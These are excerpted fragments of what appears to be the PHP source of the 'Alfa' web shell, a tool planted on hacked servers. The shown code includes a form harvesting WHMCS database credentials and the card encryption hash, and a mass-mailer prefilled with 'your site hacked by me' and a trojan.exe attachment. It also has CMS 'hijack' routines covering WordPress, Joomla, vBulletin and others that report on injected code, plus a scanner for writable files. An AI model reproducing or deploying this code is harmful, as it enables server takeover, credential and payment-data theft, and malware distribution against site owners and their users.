<textarea name='query' style='width:100%;height:100px'>";
                echo 'loadfile' != $_POST['alfa1'] ? htmlspecialchars($_POST['alfa2']) : '';
...
function alfaselfrm()
{
    if (isset($_POST['alfa1']) && 'yes' == $_POST['alfa1']) {
        echo __pre() . '<center>';
...
<input type='hidden' name='form_action' value='2'>";
    $table = ['td1' => ['color' => 'FFFFFF', 'tdName' => 'db_host : ', 'inputName' => 'db_host', 'id' => 'db_host', 'inputValue' => 'localhost', 'inputSize' => '50'],   'td2' => ['color' => 'FFFFFF', 'tdName' => 'db_username : ', 'inputName' => 'db_username', 'id' => 'db_user', 'inputValue' => '', 'inputSize' => '50'],   'td3' => ['color' => 'FFFFFF', 'tdName' => 'db_password : ', 'inputName' => 'db_password', 'id' => 'db_pw', 'inputValue' => '', 'inputSize' => '50'],   'td4' => ['color' => 'FFFFFF', 'tdName' => 'db_name : ', 'inputName' => 'db_name', 'id' => 'db_name', 'inputValue' => '', 'inputSize' => '50'],   'td5' => ['color' => 'FFFFFF', 'tdName' => 'cc_encryption_hash : ', 'inputName' => 'cc_encryption_hash', 'id' => 'cc_encryption_hash', 'inputValue' => '', 'inputSize' => '50']];
    create_table($table);
...
function alfamail()
{
    ...
    $table = ['td1' => ['color' => 'FFFFFF', 'tdName' => 'Mail To : ', 'inputName' => 'mail_to', 'inputValue' => 'targetfbi.gov', 'inputSize' => '60', 'placeholder' => true],  'td2' => ['color' => 'FFFFFF', 'tdName' => 'From : ', 'inputName' => 'mail_from', 'inputValue' => 'secgoogle.com', 'inputSize' => '60', 'placeholder' => true],  'td3' => ['color' => 'FFFFFF', 'tdName' => 'Subject : ', 'inputName' => 'mail_subject', 'inputValue' => 'your site hacked by me', 'inputSize' => '60'],  'td4' => ['color' => 'FFFFFF', 'tdName' => 'Attach File : ', 'inputName' => 'mail_attach', 'inputValue' => $GLOBALS['cwd'] . 'trojan.exe', 'inputSize' => '60'],  'td5' => ['color' => 'FFFFFF', 'tdName' => 'Count Mail : ', 'inputName' => 'count_mail', 'inputValue' => '1', 'inputSize' => '60']];
    create_table($table);
...
<input type="submit" value=" " name="ziper" />
    ...
    if (isset($_POST['alfa5']) && ('>>' == $_POST['alfa5'])) {
        $dirzip = $_POST['alfa3'];
        $zipfile = $_POST['alfa4'];
        if (class_exists('ZipArchive') && ('unix' != $GLOBALS['sys'] || !_alfa_can_runCommand(true, true))) {
...
{
    switch ($cms) {  case 'vb':  hijackvBulletin($cmspath, $saveto); break; case 'wp':  hijackwp($cmspath, $saveto); break; case 'jom':  hijackJoomla($cmspath, $saveto); break; case 'whmcs':  hijackWhmcs($cmspath, $saveto); break; case 'mybb':  hijackMybb($cmspath, $saveto); break; case 'ipb':  hijackIPB($cmspath, $saveto); break; case 'phpbb':  hijackPHPBB($cmspath, $saveto); break; default:  echo 'error!'; break; }
}
...
{
    echo 0 == $c ? "<center><font color='green'>Success</font> --> path: $p</center>" : '<center><font color="red">Error in inject code !</font></center>';
}
...
function alfasearcher()
{
    ...
    if (isset($_POST['alfa1']) && 'file' == $_POST['alfa1']) {
...
function Alfa_Searcher($dir, $ext, $method)
{
    if (is_readable($dir)) {
        ...
        switch ($method) {  case 'files' : foreach ($globFiles as $file) {
            if (is_writable($file)) {
                echo "$file<br>";
            }
        }  break; case 'dirs':  foreach ($globFiles as $file) {
            if (is_writable(dirname($file)) && !in_array(dirname($file), $blacklist)) {
                echo dirname($file) . '<br>';
                $blacklist[] = dirname($file);
            }
        }  break; case 'all':   foreach ($globFiles as $file) {
            echo $file . '<br>';
        }  break; }
        unset($blacklist);
    }
...
class AlfaCURL
{
    ...
    public function __construct($cookies = false, $compression = 'gzip', $proxy = '')
    {
